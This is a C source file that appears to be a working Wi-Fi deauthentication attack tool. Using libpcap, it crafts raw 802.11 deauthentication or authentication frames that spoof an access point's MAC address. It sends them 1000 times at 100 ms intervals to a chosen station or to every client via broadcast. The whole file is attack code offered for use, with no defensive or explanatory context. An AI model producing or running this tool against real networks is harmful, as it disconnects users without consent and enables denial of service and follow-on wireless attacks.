#include <pcap.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdio.h>
#include <linux/if_packet.h>

#define MAC_ADDR_LEN 6

void usage(char *prog) {
    printf("Usage: %s <interface> <ap mac> [<station mac> [-auth]]\n", prog);
    exit(1);
}

// Convert MAC address string to a 6-byte array
void str2mac(const char *str, unsigned char *mac) {
    sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx", &mac[0], &mac[1], &mac[2], &mac[3], &mac[4], &mac[5]);
}

// Construct the deauthentication or authentication frame
void deauth_frame(unsigned char *frame, unsigned char *ap_mac, unsigned char *station_mac, int auth) {
    // RadioTap Header (8 bytes, minimum header)
    unsigned char rtap_hdr[] = {
        0x00, 0x00, 0x08, 0x00, // Header Revision, Header Pad, Header length
        0x00, 0x00, 0x00, 0x00  // Present flags (all zero for minimal header)
    };
    memcpy(frame, rtap_hdr, sizeof(rtap_hdr));

    // 802.11 Frame Control Field (Management frame, Subtype: Authentication/Deauthentication)
    frame[8] = auth ? 0xb0 : 0xc0; // Type: Management, Subtype: Authentication (0xb0) / Deauthentication (0xc0)
    frame[9] = 0x00; // Flags
    frame[10] = 0x3a; frame[11] = 0x01; // Duration

    // MAC Addresses
    memcpy(frame + 12, station_mac, MAC_ADDR_LEN); // Destination MAC
    memcpy(frame + 18, ap_mac, MAC_ADDR_LEN); // Source MAC
    memcpy(frame + 24, ap_mac, MAC_ADDR_LEN); // BSSID

    // Sequence Control
    frame[30] = 0x00; frame[31] = 0x00; // Fragment & Sequence Number

    // Frame Body
    if (auth) {
        // Authentication Frame
        frame[32] = 0x00; frame[33] = 0x00; // Authentication Algorithm Number (0 for Open System)
        frame[34] = 0x01; frame[35] = 0x00; // Authentication Transaction Sequence Number
        frame[36] = 0x00; frame[37] = 0x00; // Status Code
    } else {
        // Deauthentication Frame
        frame[32] = 0x07; frame[33] = 0x00; // Reason Code (7 for Class 3 frame received from nonassociated STA)
    }
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        usage(argv[0]);
    }

    char *iface = argv[1];
    unsigned char ap_mac[MAC_ADDR_LEN];
    unsigned char station_mac[MAC_ADDR_LEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff}; // Default to broadcast
    int auth = 0;
    if (argc >= 4) {
        str2mac(argv[3], station_mac);
    }
    if (argc == 5 && strcmp(argv[4], "-auth") == 0) {
        auth = 1;
    }

    str2mac(argv[2], ap_mac);

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t *handle = pcap_open_live(iface, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "Couldn't open device %s: %s\n", iface, errbuf);
        return 2;
    }

    unsigned char packet[42];
    deauth_frame(packet, ap_mac, station_mac, auth);

    for (int i = 0; i < 1000; i++) {
        if (pcap_sendpacket(handle, packet, auth ? 38 : 34) != 0) {
            fprintf(stderr, "Error sending packet: %s\n", pcap_geterr(handle));
            return 2;
        }
        usleep(100000); // Sleep for 100ms
    }

    pcap_close(handle);
    return 0;
}
